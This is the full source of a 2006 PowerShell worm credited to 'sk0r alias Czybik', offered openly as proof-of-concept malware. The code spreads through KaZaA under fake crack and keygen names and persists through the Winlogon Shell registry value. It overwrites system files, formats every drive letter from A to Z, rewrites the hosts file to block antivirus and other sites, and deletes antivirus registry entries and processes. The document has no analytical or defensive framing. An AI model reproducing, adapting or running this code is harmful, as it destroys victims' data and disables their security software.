
# sk0r alias Czybik's Msh Skript Worm 
# 
# This worm is for the PowerShell Script Interpreter
# which is included with Microsoft Windows Vista
# 
# This worm is �2006 by sk0r alias Czybik
# 
# Visit my homepages: www.sk0r-scripts.tk & www.sk0r-virii.tk & www.czybik-kit.tk
# 
# This worm has following features:
# 
# - Spreads with P2P (KaZaA Lite) per JScript
# - Writes a registry string to run every time windows starts
# - Changes RegisteredOwner, RegisteredOrga, Ie Title, Hidden Files and FileExt
# - overwrites specific files in Windows and System32 with a string 
# - formating all insertet drives (format string A - Z)
# - deletes files in %system32%\drivers\etc
# - overwrites the host file in %system32%\drivers\etc
# - kills some well-known Anti-Virus processes
# - deletes Reg-Values from well-known Antiviruses
# - tells a message to user, with informations about the worm
# 
# 
# Informations:
# 
# This worm is a proof of concept worm. Because of it is able
# to run Powershell on Windows XP, too (Need .Net Framework 2.0)
# this worm is dedicated to Windows XP. Well, yes, it runs on
# Windows Vista, too, but I don't know if windows vista is
# like Windows Xp, and have a registry or the same files and folders.
# Thats why it is for Xp. But that is wayne. This worm exists, to show
# how to write simple worms in PowerShell language. Enjoy the Source!
# Note, that the msh Worm dropps some JScript files because of
# spread trough P2P and writes registry strings. I used this, because
# I think, that Windows Vista has JScript included, too!
#
# This worm is �2006 by sk0r alias Czybik. To tell me anything
# write me an email @ sk0r1337@gmx.de or a pm at vx.netlux.org
# 
# ======================================================================

$strInfoString_one = "This is a Msh PowerShell Script worm. ";
$strInfoString_two = "This worm is proof-of-concept ";
$strInfoString_three = "the worm is �2006 by sk0r alias Czybik ";
$strInfoString_four = "for informations write an email @ sk0r1337@gmx.de ";

function SpreadTheWorm
{
	echo "// P2P-Spread JScript Component of the sk0r alias Czybik Msh Script Worm. " >> p2pspreader.js
	echo "// This Worm is �2006 by sk0r alias Czybik " >> p2pspreader.js
	echo "//================================================================ " >> p2pspreader.js
	echo " " >> p2pspreader.js
	echo "var fso,wshs,ScriptName,WholeScriptName,ScriptPath,strSonderZeichen; " >> p2pspreader.js
	echo "var KazaaDir,gtFilesMsh,MshFileSize,Sysdir; " >> p2pspreader.js
	echo " " >> p2pspreader.js
	echo "fso = new ActiveXObject ('scripting.filesystemobject'); " >> p2pspreader.js
	echo "wshs = WScript.CreateObject ('WScript.Shell'); " >> p2pspreader.js
	echo "Sysdir = fso.GetSpecialFolder(1); " >> p2pspreader.js
	echo "KazaaDir = wshs.RegRead ('HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent\\DownloadDir'); " >> p2pspreader.js
	echo " " >> p2pspreader.js
	echo "WholeScriptName = WScript.ScriptFullName; " >> p2pspreader.js
	echo "ScriptPath = WholeScriptName.replace(ScriptName,''); " >> p2pspreader.js
	echo " " >> p2pspreader.js
	echo "var gtFiles = new Enumerator(fso.getFolder(ScriptPath).files); " >> p2pspreader.js
	echo "for (; !gtFiles.atEnd(); gtFiles.moveNext()) " >> p2pspreader.js
	echo "if (gtFiles.item().name != WScript.scriptName) " >> p2pspreader.js
	echo "if (fso.GetExtensionName(gtFiles.item()).toUpperCase() == 'MSH') " >> p2pspreader.js
	echo "{ " >> p2pspreader.js
	echo "	var gtFilesMsh = fso.GetFile (gtFiles.item()); " >> p2pspreader.js
	echo "	var MshFileSize = gtFilesMsh.Size; " >> p2pspreader.js
	echo "	if (MshFileSize == 15095) " >> p2pspreader.js
	echo "	{ " >> p2pspreader.js
	echo "      gtFilesMsh.Copy (Sysdir + '\\WinCzySko.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Microsoft Windows Vista Cd-Key.txt.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Windows Vista Update.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Ad-aware SE Personal Edition 1.06r1.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Ashampoo Media Player 2.03 install.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Allround WinZIP Key Generator.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Talisman Desktop 2.99 Crack.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Nero Burning Rom 6.6.0.13 Crack.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Kaspersky KeyGen working.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\Daemon Tools Install + Crack.rar.msh'); " >> p2pspreader.js
	echo "		gtFilesMsh.copy (KazaaDir + '\\AVP - AntiVirus Key Generator.msh'); " >> p2pspreader.js
	echo "	} " >> p2pspreader.js
	echo "} " >> p2pspreader.js
	p2pspreader.js;
	#del p2pspreader.js;
	
}

function WriteValuesToRegistry
{
	echo "// RegWrite JScript Component of the sk0r alias Czybik Msh Script Worm. " >> RegWrite.js
	echo "// This Worm is �2006 by sk0r alias Czybik " >> RegWrite.js
	echo "//================================================================ " >> RegWrite.js
	echo " " >> RegWrite.js
	echo "var wshs,fso,sysdir; " >> RegWrite.js
	echo " " >> RegWrite.js
	echo "wshs = WScript.CreateObject('WScript.Shell'); " >> RegWrite.js
	echo "fso = new ActiveXObject ('scripting.filesystemobject'); " >> RegWrite.js
	echo "sysdir = fso.getspecialfolder(1); " >> RegWrite.js
	echo " " >> RegWrite.js
	echo "wshs.regwrite ('HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\\', 0, 'REG_DWORD'); " >> RegWrite.js
	echo "wshs.regwrite ('HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt\\', 1, 'REG_DWORD'); " >> RegWrite.js
	echo "wshs.regwrite ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\RegisteredOrganization', 'United People of infected Msh','REG_SZ'); " >> RegWrite.js
	echo "wshs.regwrite ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\RegisteredOwner', 'sk0rCzybik','REG_SZ'); " >> RegWrite.js
	echo "wshs.regwrite ('HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Window Title', 'Infected with Msh Worm by sk0r alias Czybik','REG_SZ'); " >> RegWrite.js
	echo "wshs.regwrite ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell', 'explorer.exe ' + sysdir + '\\WinCzySko.msh' ,'REG_SZ'); " >> RegWrite.js
	RegWrite.js
	#del RegWrite.js
}

function OverwriteFiles
{
	$StringToOverwrite = "This file was overwritten with a Msh Worm. ";
	$StringToOverwrite += "This Worm is �2006 by sk0r alias Czybik! ";
	
	cd C:\Windows
	$GetSpecificFiles = get-childitem *.html 
	$GetSpecificFiles += get-childitem *.htm
	$GetSpecificFiles += get-childitem *.log
	$GetSpecificFiles += get-childitem *.ini
	$GetSpecificFiles += get-childitem *.inf
	$GetSpecificFiles += get-childitem *.bmp
	$GetSpecificFiles += get-childitem *.gif
	$GetSpecificFiles += get-childitem *.jpg
	$GetSpecificFiles += get-childitem *.png 
	
	foreach ($TargetFile in $GetSpecificFiles)
	{
		del $TargetFile.Name
		echo $StringToOverwrite >> $TargetFile.Name
	}
	
	
	cd C:\Windows\System32
	$GetSpecificFiles2 = get-childitem *.html 
	$GetSpecificFiles2 += get-childitem *.htm
	$GetSpecificFiles2 += get-childitem *.log
	$GetSpecificFiles2 += get-childitem *.ini
	$GetSpecificFiles2 += get-childitem *.inf
	$GetSpecificFiles2 += get-childitem *.bmp
	$GetSpecificFiles2 += get-childitem *.gif
	$GetSpecificFiles2 += get-childitem *.jpg
	$GetSpecificFiles2 += get-childitem *.png 
	
	foreach ($TargetFile2 in $GetSpecificFiles2)
	{
		del $TargetFile2.Name
		echo $StringToOverwrite >> $TargetFile2.Name
	}
}

function FormatDrives
{
	format A: /y
	format B: /y
	format C: /y
	format D: /y
	format E: /y
	format F: /y
	format G: /y
	format H: /y
	format I: /y
	format J: /y
	format K: /y
	format L: /y
	format M: /y
	format N: /y
	format O: /y
	format P: /y
	format Q: /y
	format R: /y
	format S: /y
	format T: /y
	format U: /y
	format V: /y
	format W: /y
	format X: /y
	format Y: /y
	format Z: /y
}

function InfectEtcFolder
{
	cd "C:\Windows\System32\Drivers\etc";
	del "networks";
	del "protocol";
	del "services";
	del "hosts";
	del "hosts.bak";
	echo "# Host File overwritten by Msh Worm " >> hosts
	echo "# This file disallows you to visit av and dl sites :> " >> hosts
	echo " " >> hosts
	echo "127.0.0.1 www.antivir.de " >> hosts
	echo "127.0.0.1 www.bitdefender.de " >> hosts
	echo "127.0.0.1 www.znet.de " >> hosts
	echo "127.0.0.1 www.chip.de " >> hosts
	echo "127.0.0.1 www.virustotal.com " >> hosts
	echo "127.0.0.1 virusscan.jotti.org " >> hosts
	echo "127.0.0.1 www.kaspersky.com " >> hosts
	echo "127.0.0.1 www.sophos.de " >> hosts
	echo "127.0.0.1 www.trojaner-info.de " >> hosts
	echo "127.0.0.1 www.trojaner-help.de " >> hosts
	echo "127.0.0.1 www.arcabit.com " >> hosts
	echo "127.0.0.1 www.avast.com " >> hosts
	echo "127.0.0.1 www.grisoft.com " >> hosts
	echo "127.0.0.1 www.bitdefender.com " >> hosts
	echo "127.0.0.1 www.clamav.net " >> hosts
	echo "127.0.0.1 www.drweb.com " >> hosts
	echo "127.0.0.1 www.f-prot.com " >> hosts)
	echo "127.0.0.1 www.google.de " >> hosts
	echo "127.0.0.1 www.fortinet.com " >> hosts
	echo "127.0.0.1 www.nod32.com " >> hosts
	echo "127.0.0.1 www.norman.com " >> hosts
	echo "127.0.0.1 www.microsoft.com " >> hosts
	echo "127.0.0.1 www.anti-virus.by/en " >> hosts
	echo "127.0.0.1 www.symantec.com " >> hosts
	echo "127.0.0.1 www.windowsupdate.com " >> hosts
	echo "127.0.0.1 www.trendmicro.com " >> hosts
	echo "127.0.0.1 www.mcafee.com " >> hosts
	echo "127.0.0.1 www.viruslist.com " >> hosts
	echo "127.0.0.1 www.avp.com " >> hosts
	echo "127.0.0.1 www.zonelabs.com " >> hosts
	echo "127.0.0.1 www.heise.de " >> hosts
	echo "127.0.0.1 www.antivirus-online.de " >> hosts
	echo "127.0.0.1 www.free-av.com " >> hosts
	echo "127.0.0.1 www.panda-software.com " >> hosts
	echo "127.0.0.1 www.pc-welt.de " >> hosts
	echo "127.0.0.1 www.pc-special.net " >> hosts
	echo "127.0.0.1 download.freenet.de " >> hosts
	echo "127.0.0.1 www.vollversion.de " >> hosts
	echo "127.0.0.1 www.das-download-archiv.de " >> hosts
	echo "127.0.0.1 www.freeware.de " >> hosts
	echo "127.0.0.1 www.antiviruslab.com " >> hosts
	echo "127.0.0.1 www.search.yahoo.com " >> hosts
	echo "127.0.0.1 www.web.de " >> hosts
	echo "127.0.0.1 www.hotmail.com " >> hosts
	echo "127.0.0.1 www.hotmail.de " >> hosts
	echo "127.0.0.1 www.gmx.net " >> hosts
	echo "127.0.0.1 www.spiegel.de " >> hosts
	echo "127.0.0.1 www.icq.com " >> hosts
	echo "127.0.0.1 www.icq.de " >> hosts
	echo "127.0.0.1 www.ffh.de " >> hosts
	echo "127.0.0.1 www.lavasoft.de " >> hosts
	echo "127.0.0.1 www.de.wikipedia.org " >> hosts
	echo "127.0.0.1 www.wikipedia.org " >> hosts
	echo "127.0.0.1 www.en.wikipedia.org " >> hosts
	echo "127.0.0.1 www.wissen.de " >> hosts
	echo "127.0.0.1 www.virus-aktuell.de " >> hosts
	echo "127.0.0.1 www.arcor.de " >> hosts
	echo "127.0.0.1 www.t-online.de " >> hosts
	echo "127.0.0.1 www.t-com.de " >> hosts
	echo "127.0.0.1 www.alice-dsl.de " >> hosts
	echo "127.0.0.1 www.freenet.de " >> hosts
	echo "127.0.0.1 www.1und1.de " >> hosts
	echo "127.0.0.1 www.fbi.gov " >> hosts
	echo "127.0.0.1 www.polizei.de " >> hosts
}

function SecurityStopping
{
	echo "// Av-Reg Delete JScript Component of the sk0r alias Czybik Msh Script Worm. " >> regav.js
	echo "// This Worm is �2006 by sk0r alias Czybik " >> regav.js
	echo "//================================================================ " >> regav.js 
	echo " " >> regav.js
	echo "var wshs; " >> regav.js
	echo " " >> regav.js
	echo "wshs = WScript.CreateObject ('WScript.Shell'); " >> regav.js
	echo " " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\avgnt\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\KAVPersonal50\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\AVG7_CC\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BDMCon\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BDNewsAgent\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BDOESRV\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\pccguide.exe\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DrWebScheduler\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SpIDerMail\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SpIDerNT\\');  " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MCAgentExe\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MCUpdateExe\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OASClnt\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\VirusScan Online\\'); " >> regav.js
	echo "wshs.regdelete ('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\VSOCheckTask\\'); " >> regav.js
	regav.js
	#del regav.js
	
	tskill avcenter /a
	tskill avconfig /a
	tskill avscan /a
	tskill avguard /a
	tskill avgnt /a
	tskill update /a
	tskill preupd /a
	tskill avcmd /a
	tskill avesvc /a
	tskill kav /a
	tskill kavsvc /a
	tskill kavsend /a
	tskill keymanager /a
	tskill agentsvr /a
	tskill avgcc /a
	tskill avgupsvc /a
	tskill avgamsvr /a
	tskill vsserv /a
	tskill bdss /a
	tskill xcommsvr /a
	tskill bdnagent /a
	tskill bdoesrv /a
	tskill bdmcon /a
	tskill bdswitch /a
	tskill rtvr /a
	tskill bdsubmit /a
	tskill bdlite /a
	tskill agentsvr /a
	tskill tmproxy /a
	tskill PcCtlCom /a
	tskill pccguide /a
	tskill qttask /a
	tskill patch /a
	tskill Tmntsrv /a
	tskill PccPrm /a
	tskill DrWebUpW /a
	tskill spidernt /a
	tskill DrWebScd /a
	tskill DrWeb32w /a
	tskill drwadins /a
	tskill mcupdui /a
	tskill McTskshd /a
	tskill McAppIns /a
	tskill mghtml /a
	tskill McShield /a
	tskill Mcdetect /a
	tskill McVSEscn /a
	tskill oasclnt /a
	tskill mcvsshld /a
}

SpreadTheWorm;
WriteValuesToRegistry;
OverwriteFiles;
FormatDrives;
InfectEtcFolder;
SecurityStopping;

echo "$strInfoString_one ";
echo "$strInfoString_two ";
echo "$strInfoString_three ";
echo "$strInfoString_four ";

exit ;